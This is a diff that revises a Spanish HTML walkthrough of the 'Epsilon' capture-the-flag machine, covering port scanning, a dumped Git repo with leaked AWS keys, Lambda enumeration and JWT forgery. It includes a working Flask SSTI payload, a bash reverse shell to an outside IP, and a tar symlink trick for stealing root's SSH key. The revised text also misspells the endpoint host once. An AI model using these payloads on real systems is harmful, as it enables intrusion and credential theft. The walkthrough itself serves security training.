@@ -1,39 +1,58 @@
 <h2>Overview</h2>
-<p>Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Las credenciales de AWS se filtran en los commits de Git, permitiendo descargar el código de la función Lambda. La clave secreta en el código fuente se puede usar para falsificar una cookie y acceder a la aplicación web. Finalmente, se escala a root abusando de un cronjob que ejecuta tar con enlaces simbólicos.</p>
+<p>Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Durante la enumeración se descubren credenciales de AWS Lambda filtradas en los commits de Git, lo que permite obtener la clave secreta utilizada para firmar JWT en la aplicación Flask. Con esta clave podemos falsificar cookies de administrador y acceder a rutas protegidas. Finalmente, se escala a root abusando de un cronjob que ejecuta <code>tar</code> con la opción <code>-h</code>, lo que permite reemplazar archivos críticos mediante enlaces simbólicos.</p>
 
 <h2>Key steps</h2>
 <ol>
   <li>Escaneo y enumeración de puertos con <code>nmap</code>.</li>
-  <li>Enumeración de la aplicación web (HTTP) y volcado del repositorio Git.</li>
-  <li>Análisis de los scripts Python y extracción de credenciales de AWS Lambda.</li>
-  <li>Generación de token JWT usando la clave secreta para acceso administrativo.</li>
-  <li>Explotación de SSTI en la aplicación Flask para obtener shell.</li>
-  <li>Escalada de privilegios usando cronjob con tar y enlaces simbólicos.</li>
+  <li>Enumeración de la aplicación web y volcado del repositorio Git.</li>
+  <li>Análisis de scripts Python y extracción de credenciales AWS Lambda.</li>
+  <li>Generación de token JWT con la clave secreta para acceso administrativo.</li>
+  <li>Explotación SSTI en la aplicación Flask para obtener shell.</li>
+  <li>Escalada de privilegios usando cronjob con <code>tar</code> y enlaces simbólicos.</li>
 </ol>
 
-<h3>1. Enumeración</h3>
+<h3>1. Enumeración de puertos</h3>
+<p>El primer paso es identificar qué servicios están expuestos. Se realiza un escaneo completo de todos los puertos TCP abiertos con <code>nmap</code>, buscando obtener información rápida y detallada sin alertar demasiado al sistema.</p>
 <pre><code>nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.134</code></pre>
 
-<p>Puertos abiertos:</p>
+<p>Explicación de los flags:</p>
+<ul>
+  <li><code>-p-</code>: Escanea todos los 65535 puertos.</li>
+  <li><code>--open</code>: Solo muestra los puertos abiertos.</li>
+  <li><code>-sT</code>: Escaneo TCP completo (stealth limitado).</li>
+  <li><code>--min-rate 5000</code>: Envía al menos 5000 paquetes por segundo para acelerar el escaneo.</li>
+  <li><code>-vvv</code>: Máxima verbosidad, muestra progreso detallado.</li>
+  <li><code>-n</code>: Evita resolución de DNS.</li>
+  <li><code>-Pn</code>: No realiza ping antes de escanear.</li>
+</ul>
+
+<p>Resultados obtenidos:</p>
 <pre><code>22/tcp   open  ssh
 80/tcp   open  http
 5000/tcp open  http</code></pre>
 
-<h3>2. Enumeración HTTP</h3>
-<p>Volcamos el repositorio Git expuesto en / con githack/gitdumper:</p>
+<p>Observamos que el servidor expone SSH, HTTP estándar y un servidor HTTP adicional en el puerto 5000. Esto indica que hay una aplicación web corriendo en 5000 y posiblemente un sitio público en 80.</p>
+
+<h3>2. Enumeración HTTP y volcado del repositorio Git</h3>
+<p>Se analiza el puerto 80. Al abrir el sitio web se recibe un código 403, lo que indica que el acceso está prohibido, pero es posible que el repositorio Git esté presente en <code>/.git</code>. Usamos <code>gitdumper</code> para volcarlo:</p>
 <pre><code>./gitdumper.sh http://10.10.10.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
 
-<p>Archivos encontrados: <code>server.py</code> y <code>track_api_CR_148.py</code></p>
+<p>Archivos importantes encontrados:</p>
+<ul>
+  <li><code>server.py</code>: Contiene la lógica de autenticación con JWT.</li>
+  <li><code>track_api_CR_148.py</code>: Contiene credenciales de AWS y lógica para Lambda.</li>
+</ul>
 
-<h4>track_api_CR_148.py (commit relevante)</h4>
+<h4>track_api_CR_148.py</h4>
+<p>Al revisar el commit original:</p>
 <pre><code>aws_access_key_id='AQLA5M37BDN6FJP76TDC'
 aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
 region_name='us-east-1'
-endpoint_url='http://cloud.epsilon.htb'</code></pre>
+endpoint_url='http://cloud.epsilong.htb'</code></pre>
 
-<p>Esta información nos permite interactuar con el endpoint de AWS Lambda.</p>
+<p>Se observa que las credenciales de AWS Lambda están codificadas directamente en el script, junto con la URL del endpoint. Esto nos permitirá enumerar funciones Lambda usando AWS CLI.</p>
 
-<h4>server.py (commit relevante)</h4>
+<h4>server.py</h4>
 <pre><code>secret = '&lt;secret_key&gt;'
 
 @app.route("/", methods=["GET","POST"])
@@ -46,7 +65,10 @@ def index():
             res.headers['location']='/home'
             return res,302</code></pre>
 
+<p>El script define rutas para login, /home, /track y /order. Observamos que la autenticación se realiza mediante un JWT firmado con <code>secret</code>. Conocer este valor es crítico para falsificar cookies y acceder como administrador.</p>
+
 <h3>3. Enumeración AWS Lambda</h3>
+<p>Se configura AWS CLI con las credenciales extraídas y se lista la función Lambda activa:</p>
 <pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions
 {
     "Functions": [
@@ -57,43 +79,43 @@ def index():
             "Role": "arn:aws:iam::123456789012:role/service-role/dev",
             "Handler": "my-function.handler",
             "CodeSize": 478,
-            "Description": "",
             "Timeout": 3,
             "LastModified": "2021-11-21T14:38:10.553+0000",
-            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
-            "Version": "$LATEST",
-            "VpcConfig": {},
-            "TracingConfig": {"Mode": "PassThrough"},
-            "RevisionId": "2c84c0b6-df38-441d-a88d-ff51679c32e6",
             "State": "Active",
-            "LastUpdateStatus": "Successful",
             "PackageType": "Zip"
         }
     ]
 }</code></pre>
 
-<p>Se descarga el código de la función Lambda y se obtiene el <code>secret</code> usado para firmar JWT.</p>
+<p>Descargamos el código de la función Lambda, que contiene la clave secreta usada para firmar JWT:</p>
+<pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
+wget http://cloud.epsilon.htb/path/to/code.zip
+unzip code.zip
+cat lambda_function.py</code></pre>
 
 <h3>4. Explotación y acceso inicial</h3>
-<p>Generamos un token JWT de administrador usando PyJWT y lo colocamos en la cookie <code>auth</code>:</p>
+<p>Se genera un token JWT de administrador usando PyJWT:</p>
 <pre><code>import jwt
 secret = 'VALOR_EXTRAIDO_DEL_LAMBDA'
 token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
 print(token)</code></pre>
 
+<p>Este token se coloca en la cookie <code>auth</code> para obtener acceso a la ruta /home:</p>
 <pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home</code></pre>
 
-<p>Se obtiene acceso administrativo a la aplicación web.</p>
+<p>Ahora tenemos acceso administrativo a la aplicación web.</p>
 
 <h4>Explotación SSTI</h4>
-<p>En la ruta /order se encontró vulnerabilidad SSTI usando Flask:</p>
+<p>En /order se identifica que los campos de entrada son evaluados en <code>render_template_string</code>, lo que permite SSTI. Probamos un payload básico para verificar la vulnerabilidad:</p>
 <pre><code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</code></pre>
 
-<p>Se genera reverse shell:</p>
+<p>Con esto se confirma que podemos ejecutar comandos en el servidor.</p>
+
+<p>Se obtiene reverse shell usando bash:</p>
 <pre><code>bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"</code></pre>
 
 <h3>5. Escalada de privilegios</h3>
-<p>Se utiliza <code>pspy</code> para enumerar cronjobs y detectar backups periódicos que usan tar:</p>
+<p>Se utiliza <code>pspy</code> para enumerar cronjobs y detectar backups periódicos con <code>tar</code>:</p>
 <pre><code>#!/bin/bash
 file=`date +%N`
 /usr/bin/rm -rf /opt/backups/*
@@ -104,7 +126,7 @@ check_file=`date +%N`
 /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
 /usr/bin/rm -rf /opt/backups/*</code></pre>
 
-<p>Se crea un enlace simbólico de <code>id_rsa</code> de root a <code>/opt/backups/checksum</code> para capturar la clave durante el backup:</p>
+<p>Se aprovecha la opción <code>-h</code> de <code>tar</code> para crear un enlace simbólico apuntando a <code>/root/.ssh/id_rsa</code>:</p>
 <pre><code>#!/bin/bash
 while true; do 
     if [ -e /opt/backups/checksum ]; then 
@@ -114,8 +136,8 @@ while true; do
     fi; 
 done</code></pre>
 
-<p>Una vez obtenido <code>id_rsa</code>, se conecta vía SSH como root:</p>
+<p>Una vez capturada la clave privada, se conecta vía SSH como root:</p>
 <pre><code>ssh -i id_rsa root@10.10.10.134</code></pre>
 
-<p>Con esto se completa la resolución de la máquina Epsilon.</p>
+<p>Con esto se completa el acceso completo a la máquina Epsilon.</p>
 
